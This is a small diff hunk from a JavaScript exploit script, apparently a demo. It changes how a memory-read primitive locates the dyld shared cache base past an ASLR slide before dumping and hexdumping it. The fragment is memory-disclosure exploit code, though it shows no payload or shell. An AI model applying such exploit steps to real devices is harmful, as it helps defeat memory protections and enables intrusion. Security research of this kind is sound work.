@@ -490,7 +490,7 @@ function exploit(){
 	    //log('[+] Which has magic '+magic.toString(16));
 	    log('[*] We will now walk down the code to find the illegal instruction for demo purposes...');
 	    tmp = base;
-	    var dcache_base = Add(0x180000000 - 0x1000,slide);
+	    var dcache_base = Add(0x180000000,slide);
 	    var dcache_dump = String.fromCharCode(...memory.copyfrom(dcache_base, 0, 500)); //dump first 100-bytes
 	    log('[+] Dumping dyld shared cache...');
 	    log(hexdump(dcache_dump, 8, dcache_base));
